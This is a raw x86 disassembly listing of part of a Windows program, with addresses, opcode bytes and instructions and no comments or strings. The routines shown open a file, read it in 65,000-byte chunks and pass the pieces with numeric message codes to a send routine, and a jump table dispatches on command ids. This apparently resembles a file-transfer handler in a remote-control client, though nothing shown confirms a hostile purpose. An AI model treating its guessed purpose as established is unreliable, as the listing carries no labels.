  40249f:	e9 02 ff ff ff       	jmp    0x4023a6
  4024a4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4024a7:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4024ad:	3b c6                	cmp    %esi,%eax
  4024af:	72 29                	jb     0x4024da
  4024b1:	56                   	push   %esi
  4024b2:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4024b5:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4024bb:	50                   	push   %eax
  4024bc:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4024bf:	50                   	push   %eax
  4024c0:	8d 8d a8 fb ff ff    	lea    -0x458(%ebp),%ecx
  4024c6:	e8 b5 fc ff ff       	call   0x402180
  4024cb:	50                   	push   %eax
  4024cc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4024cf:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4024d5:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4024d8:	eb 30                	jmp    0x40250a
  4024da:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4024dd:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4024e3:	50                   	push   %eax
  4024e4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4024e7:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4024ed:	50                   	push   %eax
  4024ee:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4024f1:	50                   	push   %eax
  4024f2:	8d 8d a8 fb ff ff    	lea    -0x458(%ebp),%ecx
  4024f8:	e8 83 fc ff ff       	call   0x402180
  4024fd:	50                   	push   %eax
  4024fe:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402501:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  402507:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40250a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402510:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402513:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  402519:	3b c6                	cmp    %esi,%eax
  40251b:	0f 86 10 ff ff ff    	jbe    0x402431
  402521:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  402526:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402529:	ff 30                	push   (%eax)
  40252b:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40252e:	56                   	push   %esi
  40252f:	50                   	push   %eax
  402530:	ff 15 cc d2 40 00    	call   *0x40d2cc
  402536:	50                   	push   %eax
  402537:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40253a:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  402540:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402543:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402549:	e9 f1 fe ff ff       	jmp    0x40243f
  40254e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402551:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402554:	50                   	push   %eax
  402555:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40255b:	b3 01                	mov    $0x1,%bl
  40255d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402560:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402566:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402569:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40256f:	8a c3                	mov    %bl,%al
  402571:	eb 02                	jmp    0x402575
  402573:	32 c0                	xor    %al,%al
  402575:	5f                   	pop    %edi
  402576:	5e                   	pop    %esi
  402577:	5b                   	pop    %ebx
  402578:	c9                   	leave
  402579:	c3                   	ret
  40257a:	55                   	push   %ebp
  40257b:	8b ec                	mov    %esp,%ebp
  40257d:	83 ec 44             	sub    $0x44,%esp
  402580:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402583:	56                   	push   %esi
  402584:	50                   	push   %eax
  402585:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402588:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40258e:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  402591:	ff 15 bc d2 40 00    	call   *0x40d2bc
  402597:	8b f0                	mov    %eax,%esi
  402599:	80 3e 00             	cmpb   $0x0,(%esi)
  40259c:	0f 84 85 00 00 00    	je     0x402627
  4025a2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4025a5:	6a 0a                	push   $0xa
  4025a7:	50                   	push   %eax
  4025a8:	56                   	push   %esi
  4025a9:	ff 15 60 d1 40 00    	call   *0x40d160
  4025af:	50                   	push   %eax
  4025b0:	ff 15 88 d3 40 00    	call   *0x40d388
  4025b6:	83 c4 0c             	add    $0xc,%esp
  4025b9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4025bc:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4025bf:	6a 2d                	push   $0x2d
  4025c1:	50                   	push   %eax
  4025c2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4025c5:	50                   	push   %eax
  4025c6:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4025cc:	8b c8                	mov    %eax,%ecx
  4025ce:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4025d4:	50                   	push   %eax
  4025d5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4025d8:	50                   	push   %eax
  4025d9:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4025dc:	50                   	push   %eax
  4025dd:	e8 be a0 00 00       	call   0x40c6a0
  4025e2:	83 c4 0c             	add    $0xc,%esp
  4025e5:	50                   	push   %eax
  4025e6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4025e9:	50                   	push   %eax
  4025ea:	e8 cf a0 00 00       	call   0x40c6be
  4025ef:	83 c4 0c             	add    $0xc,%esp
  4025f2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4025f5:	50                   	push   %eax
  4025f6:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4025fc:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4025ff:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402605:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402608:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40260e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402611:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402617:	56                   	push   %esi
  402618:	ff 15 64 d1 40 00    	call   *0x40d164
  40261e:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  402622:	e9 72 ff ff ff       	jmp    0x402599
  402627:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40262a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40262d:	50                   	push   %eax
  40262e:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402634:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402637:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40263d:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  402640:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402646:	8b 45 08             	mov    0x8(%ebp),%eax
  402649:	5e                   	pop    %esi
  40264a:	c9                   	leave
  40264b:	c3                   	ret
  40264c:	55                   	push   %ebp
  40264d:	8b ec                	mov    %esp,%ebp
  40264f:	81 ec 3c 01 00 00    	sub    $0x13c,%esp
  402655:	53                   	push   %ebx
  402656:	56                   	push   %esi
  402657:	57                   	push   %edi
  402658:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40265b:	e8 40 ea ff ff       	call   0x4010a0
  402660:	33 db                	xor    %ebx,%ebx
  402662:	c7 45 f8 e8 fd 00 00 	movl   $0xfde8,-0x8(%ebp)
  402669:	53                   	push   %ebx
  40266a:	68 80 00 00 00       	push   $0x80
  40266f:	6a 03                	push   $0x3
  402671:	53                   	push   %ebx
  402672:	53                   	push   %ebx
  402673:	68 00 00 00 80       	push   $0x80000000
  402678:	ff 75 08             	push   0x8(%ebp)
  40267b:	ff 15 50 d1 40 00    	call   *0x40d150
  402681:	83 f8 ff             	cmp    $0xffffffff,%eax
  402684:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402687:	75 20                	jne    0x4026a9
  402689:	83 ec 10             	sub    $0x10,%esp
  40268c:	8d 45 0c             	lea    0xc(%ebp),%eax
  40268f:	8b cc                	mov    %esp,%ecx
  402691:	50                   	push   %eax
  402692:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402698:	6a 53                	push   $0x53
  40269a:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  40269f:	e8 86 ea ff ff       	call   0x40112a
  4026a4:	e9 25 03 00 00       	jmp    0x4029ce
  4026a9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4026ac:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4026af:	51                   	push   %ecx
  4026b0:	50                   	push   %eax
  4026b1:	ff 15 54 d1 40 00    	call   *0x40d154
  4026b7:	83 ec 10             	sub    $0x10,%esp
  4026ba:	be 78 11 41 00       	mov    $0x411178,%esi
  4026bf:	8b fc                	mov    %esp,%edi
  4026c1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4026c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4026c5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4026c6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4026c7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4026ca:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4026cd:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  4026d0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4026d1:	e8 2d ea ff ff       	call   0x401103
  4026d6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4026d9:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4026dc:	50                   	push   %eax
  4026dd:	ff 75 08             	push   0x8(%ebp)
  4026e0:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4026e6:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4026e9:	50                   	push   %eax
  4026ea:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4026ed:	50                   	push   %eax
  4026ee:	e8 7b 8b 00 00       	call   0x40b26e
  4026f3:	51                   	push   %ecx
  4026f4:	51                   	push   %ecx
  4026f5:	8b cc                	mov    %esp,%ecx
  4026f7:	50                   	push   %eax
  4026f8:	68 e8 d5 40 00       	push   $0x40d5e8
  4026fd:	51                   	push   %ecx
  4026fe:	e8 c1 9f 00 00       	call   0x40c6c4
  402703:	51                   	push   %ecx
  402704:	8d 45 fe             	lea    -0x2(%ebp),%eax
  402707:	8b cc                	mov    %esp,%ecx
  402709:	50                   	push   %eax
  40270a:	68 18 d5 40 00       	push   $0x40d518
  40270f:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  402715:	e8 d6 84 00 00       	call   0x40abf0
  40271a:	83 c4 20             	add    $0x20,%esp
  40271d:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  402720:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402726:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402729:	ff 15 9c d2 40 00    	call   *0x40d29c
  40272f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402732:	33 d2                	xor    %edx,%edx
  402734:	b9 e8 fd 00 00       	mov    $0xfde8,%ecx
  402739:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  402740:	f7 f1                	div    %ecx
  402742:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  402745:	8b f8                	mov    %eax,%edi
  402747:	47                   	inc    %edi
  402748:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40274b:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40274e:	0f 86 67 02 00 00    	jbe    0x4029bb
  402754:	be 68 11 41 00       	mov    $0x411168,%esi
  402759:	eb 03                	jmp    0x40275e
  40275b:	8b 7d c4             	mov    -0x3c(%ebp),%edi
  40275e:	3b 5d e8             	cmp    -0x18(%ebp),%ebx
  402761:	72 10                	jb     0x402773
  402763:	77 08                	ja     0x40276d
  402765:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402768:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40276b:	76 06                	jbe    0x402773
  40276d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402770:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402773:	ff 75 f8             	push   -0x8(%ebp)
  402776:	e8 b5 9c 00 00       	call   0x40c430
  40277b:	59                   	pop    %ecx
  40277c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40277f:	53                   	push   %ebx
  402780:	53                   	push   %ebx
  402781:	ff 75 f4             	push   -0xc(%ebp)
  402784:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  402787:	ff 75 ec             	push   -0x14(%ebp)
  40278a:	ff 15 5c d1 40 00    	call   *0x40d15c
  402790:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402793:	53                   	push   %ebx
  402794:	50                   	push   %eax
  402795:	ff 75 f8             	push   -0x8(%ebp)
  402798:	ff 75 e0             	push   -0x20(%ebp)
  40279b:	ff 75 ec             	push   -0x14(%ebp)
  40279e:	ff 15 7c d1 40 00    	call   *0x40d17c
  4027a4:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4027a7:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4027aa:	50                   	push   %eax
  4027ab:	ff 75 08             	push   0x8(%ebp)
  4027ae:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  4027b4:	8d 45 d7             	lea    -0x29(%ebp),%eax
  4027b7:	8d 8d c4 fe ff ff    	lea    -0x13c(%ebp),%ecx
  4027bd:	50                   	push   %eax
  4027be:	ff 75 d0             	push   -0x30(%ebp)
  4027c1:	ff 75 e0             	push   -0x20(%ebp)
  4027c4:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4027ca:	83 ec 10             	sub    $0x10,%esp
  4027cd:	8b d4                	mov    %esp,%edx
  4027cf:	50                   	push   %eax
  4027d0:	8d 45 2c             	lea    0x2c(%ebp),%eax
  4027d3:	56                   	push   %esi
  4027d4:	50                   	push   %eax
  4027d5:	56                   	push   %esi
  4027d6:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  4027dc:	57                   	push   %edi
  4027dd:	50                   	push   %eax
  4027de:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4027e1:	e8 ab 89 00 00       	call   0x40b191
  4027e6:	59                   	pop    %ecx
  4027e7:	59                   	pop    %ecx
  4027e8:	50                   	push   %eax
  4027e9:	56                   	push   %esi
  4027ea:	ff 75 d8             	push   -0x28(%ebp)
  4027ed:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  4027f3:	50                   	push   %eax
  4027f4:	e8 98 89 00 00       	call   0x40b191
  4027f9:	59                   	pop    %ecx
  4027fa:	59                   	pop    %ecx
  4027fb:	50                   	push   %eax
  4027fc:	8d 45 1c             	lea    0x1c(%ebp),%eax
  4027ff:	56                   	push   %esi
  402800:	50                   	push   %eax
  402801:	8d 45 0c             	lea    0xc(%ebp),%eax
  402804:	56                   	push   %esi
  402805:	50                   	push   %eax
  402806:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402809:	56                   	push   %esi
  40280a:	50                   	push   %eax
  40280b:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  402811:	50                   	push   %eax
  402812:	e8 b7 8a 00 00       	call   0x40b2ce
  402817:	59                   	pop    %ecx
  402818:	59                   	pop    %ecx
  402819:	50                   	push   %eax
  40281a:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  402820:	50                   	push   %eax
  402821:	e8 92 9e 00 00       	call   0x40c6b8
  402826:	83 c4 0c             	add    $0xc,%esp
  402829:	50                   	push   %eax
  40282a:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  402830:	50                   	push   %eax
  402831:	e8 82 9e 00 00       	call   0x40c6b8
  402836:	83 c4 0c             	add    $0xc,%esp
  402839:	50                   	push   %eax
  40283a:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40283d:	50                   	push   %eax
  40283e:	e8 75 9e 00 00       	call   0x40c6b8
  402843:	83 c4 0c             	add    $0xc,%esp
  402846:	50                   	push   %eax
  402847:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40284a:	50                   	push   %eax
  40284b:	e8 68 9e 00 00       	call   0x40c6b8
  402850:	83 c4 0c             	add    $0xc,%esp
  402853:	50                   	push   %eax
  402854:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  40285a:	50                   	push   %eax
  40285b:	e8 58 9e 00 00       	call   0x40c6b8
  402860:	83 c4 0c             	add    $0xc,%esp
  402863:	50                   	push   %eax
  402864:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  40286a:	50                   	push   %eax
  40286b:	e8 48 9e 00 00       	call   0x40c6b8
  402870:	83 c4 0c             	add    $0xc,%esp
  402873:	50                   	push   %eax
  402874:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  40287a:	50                   	push   %eax
  40287b:	e8 38 9e 00 00       	call   0x40c6b8
  402880:	83 c4 0c             	add    $0xc,%esp
  402883:	50                   	push   %eax
  402884:	8d 85 14 ff ff ff    	lea    -0xec(%ebp),%eax
  40288a:	50                   	push   %eax
  40288b:	e8 28 9e 00 00       	call   0x40c6b8
  402890:	83 c4 0c             	add    $0xc,%esp
  402893:	50                   	push   %eax
  402894:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  40289a:	50                   	push   %eax
  40289b:	e8 18 9e 00 00       	call   0x40c6b8
  4028a0:	83 c4 0c             	add    $0xc,%esp
  4028a3:	50                   	push   %eax
  4028a4:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  4028aa:	50                   	push   %eax
  4028ab:	e8 08 9e 00 00       	call   0x40c6b8
  4028b0:	83 c4 0c             	add    $0xc,%esp
  4028b3:	50                   	push   %eax
  4028b4:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4028b7:	50                   	push   %eax
  4028b8:	e8 fb 9d 00 00       	call   0x40c6b8
  4028bd:	83 c4 0c             	add    $0xc,%esp
  4028c0:	50                   	push   %eax
  4028c1:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4028c4:	50                   	push   %eax
  4028c5:	e8 ee 9d 00 00       	call   0x40c6b8
  4028ca:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4028cd:	83 c4 0c             	add    $0xc,%esp
  4028d0:	6a 52                	push   $0x52
  4028d2:	e8 53 e8 ff ff       	call   0x40112a
  4028d7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4028da:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4028dd:	0f 94 45 ff          	sete   -0x1(%ebp)
  4028e1:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4028e7:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  4028ed:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4028f3:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  4028f9:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4028ff:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  402905:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40290b:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  402911:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402917:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  40291d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402923:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  402929:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40292f:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  402932:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402938:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  40293b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402941:	8d 8d 64 ff ff ff    	lea    -0x9c(%ebp),%ecx
  402947:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40294d:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
  402953:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402959:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40295f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402965:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40296b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402971:	8d 8d e4 fe ff ff    	lea    -0x11c(%ebp),%ecx
  402977:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40297d:	8d 8d c4 fe ff ff    	lea    -0x13c(%ebp),%ecx
  402983:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402989:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40298c:	ff 15 9c d2 40 00    	call   *0x40d29c
  402992:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  402995:	75 5b                	jne    0x4029f2
  402997:	ff 75 e0             	push   -0x20(%ebp)
  40299a:	e8 53 9a 00 00       	call   0x40c3f2
  40299f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4029a2:	59                   	pop    %ecx
  4029a3:	29 45 e4             	sub    %eax,-0x1c(%ebp)
  4029a6:	19 5d e8             	sbb    %ebx,-0x18(%ebp)
  4029a9:	01 45 f4             	add    %eax,-0xc(%ebp)
  4029ac:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4029af:	ff 45 d8             	incl   -0x28(%ebp)
  4029b2:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  4029b5:	0f 82 a0 fd ff ff    	jb     0x40275b
  4029bb:	ff 75 ec             	push   -0x14(%ebp)
  4029be:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  4029c4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4029c7:	e8 90 e7 ff ff       	call   0x40115c
  4029cc:	b3 01                	mov    $0x1,%bl
  4029ce:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4029d1:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4029d7:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  4029da:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4029e0:	8d 4d 2c             	lea    0x2c(%ebp),%ecx
  4029e3:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4029e9:	8a c3                	mov    %bl,%al
  4029eb:	5f                   	pop    %edi
  4029ec:	5e                   	pop    %esi
  4029ed:	5b                   	pop    %ebx
  4029ee:	c9                   	leave
  4029ef:	c2 34 00             	ret    $0x34
  4029f2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4029f5:	e8 62 e7 ff ff       	call   0x40115c
  4029fa:	ff 75 ec             	push   -0x14(%ebp)
  4029fd:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  402a03:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  402a06:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402a0c:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402a0f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402a15:	8d 4d 2c             	lea    0x2c(%ebp),%ecx
  402a18:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402a1e:	32 c0                	xor    %al,%al
  402a20:	eb c9                	jmp    0x4029eb
  402a22:	55                   	push   %ebp
  402a23:	8b ec                	mov    %esp,%ebp
  402a25:	53                   	push   %ebx
  402a26:	bb e8 16 41 00       	mov    $0x4116e8,%ebx
  402a2b:	56                   	push   %esi
  402a2c:	57                   	push   %edi
  402a2d:	8b cb                	mov    %ebx,%ecx
  402a2f:	e8 6c e6 ff ff       	call   0x4010a0
  402a34:	83 ec 10             	sub    $0x10,%esp
  402a37:	be 78 11 41 00       	mov    $0x411178,%esi
  402a3c:	8b fc                	mov    %esp,%edi
  402a3e:	8b cb                	mov    %ebx,%ecx
  402a40:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402a41:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402a42:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402a43:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402a44:	e8 ba e6 ff ff       	call   0x401103
  402a49:	83 ec 10             	sub    $0x10,%esp
  402a4c:	8d 45 08             	lea    0x8(%ebp),%eax
  402a4f:	8b cc                	mov    %esp,%ecx
  402a51:	50                   	push   %eax
  402a52:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402a58:	68 98 00 00 00       	push   $0x98
  402a5d:	8b cb                	mov    %ebx,%ecx
  402a5f:	e8 c6 e6 ff ff       	call   0x40112a
  402a64:	6a 01                	push   $0x1
  402a66:	68 80 2a 40 00       	push   $0x402a80
  402a6b:	8b cb                	mov    %ebx,%ecx
  402a6d:	e8 3f e7 ff ff       	call   0x4011b1
  402a72:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402a75:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402a7b:	5f                   	pop    %edi
  402a7c:	5e                   	pop    %esi
  402a7d:	5b                   	pop    %ebx
  402a7e:	5d                   	pop    %ebp
  402a7f:	c3                   	ret
  402a80:	55                   	push   %ebp
  402a81:	8b ec                	mov    %esp,%ebp
  402a83:	81 ec a4 02 00 00    	sub    $0x2a4,%esp
  402a89:	53                   	push   %ebx
  402a8a:	56                   	push   %esi
  402a8b:	8b 75 08             	mov    0x8(%ebp),%esi
  402a8e:	57                   	push   %edi
  402a8f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  402a92:	8d 46 18             	lea    0x18(%esi),%eax
  402a95:	50                   	push   %eax
  402a96:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402a9c:	ff 76 28             	push   0x28(%esi)
  402a9f:	ff 15 88 d1 40 00    	call   *0x40d188
  402aa5:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  402aa8:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  402aae:	8b 38                	mov    (%eax),%edi
  402ab0:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  402ab5:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  402ab8:	ff 30                	push   (%eax)
  402aba:	8d 45 90             	lea    -0x70(%ebp),%eax
  402abd:	6a 04                	push   $0x4
  402abf:	50                   	push   %eax
  402ac0:	ff 15 cc d2 40 00    	call   *0x40d2cc
  402ac6:	83 ec 10             	sub    $0x10,%esp
  402ac9:	be 68 11 41 00       	mov    $0x411168,%esi
  402ace:	8b cc                	mov    %esp,%ecx
  402ad0:	56                   	push   %esi
  402ad1:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402ad7:	83 ec 10             	sub    $0x10,%esp
  402ada:	8d 45 90             	lea    -0x70(%ebp),%eax
  402add:	8b cc                	mov    %esp,%ecx
  402adf:	50                   	push   %eax
  402ae0:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402ae6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402ae9:	50                   	push   %eax
  402aea:	e8 fe 88 00 00       	call   0x40b3ed
  402aef:	8d 87 79 ff ff ff    	lea    -0x87(%edi),%eax
  402af5:	83 c4 24             	add    $0x24,%esp
  402af8:	83 f8 0a             	cmp    $0xa,%eax
  402afb:	0f 87 42 09 00 00    	ja     0x403443
  402b01:	ff 24 85 66 34 40 00 	jmp    *0x403466(,%eax,4)
  402b08:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  402b0e:	50                   	push   %eax
  402b0f:	6a 64                	push   $0x64
  402b11:	ff 15 40 d1 40 00    	call   *0x40d140
  402b17:	8d 45 d7             	lea    -0x29(%ebp),%eax
  402b1a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402b1d:	50                   	push   %eax
  402b1e:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  402b24:	6a 64                	push   $0x64
  402b26:	50                   	push   %eax
  402b27:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  402b2d:	6a 02                	push   $0x2
  402b2f:	6a 00                	push   $0x0
  402b31:	68 f4 d6 40 00       	push   $0x40d6f4
  402b36:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402b39:	ff 15 2c d2 40 00    	call   *0x40d22c
  402b3f:	40                   	inc    %eax
  402b40:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402b43:	50                   	push   %eax
  402b44:	ff 15 30 d2 40 00    	call   *0x40d230
  402b4a:	83 ec 10             	sub    $0x10,%esp
  402b4d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402b50:	8b cc                	mov    %esp,%ecx
  402b52:	50                   	push   %eax
  402b53:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402b59:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  402b5f:	50                   	push   %eax
  402b60:	e8 15 fa ff ff       	call   0x40257a
  402b65:	59                   	pop    %ecx
  402b66:	8b fc                	mov    %esp,%edi
  402b68:	50                   	push   %eax
  402b69:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402b6c:	56                   	push   %esi
  402b6d:	50                   	push   %eax
  402b6e:	8d 85 e0 fd ff ff    	lea    -0x220(%ebp),%eax
  402b74:	50                   	push   %eax
  402b75:	e8 3e 9b 00 00       	call   0x40c6b8
  402b7a:	83 c4 0c             	add    $0xc,%esp
  402b7d:	50                   	push   %eax
  402b7e:	57                   	push   %edi
  402b7f:	e8 34 9b 00 00       	call   0x40c6b8
  402b84:	83 c4 0c             	add    $0xc,%esp
  402b87:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  402b8c:	6a 51                	push   $0x51
  402b8e:	e8 97 e5 ff ff       	call   0x40112a
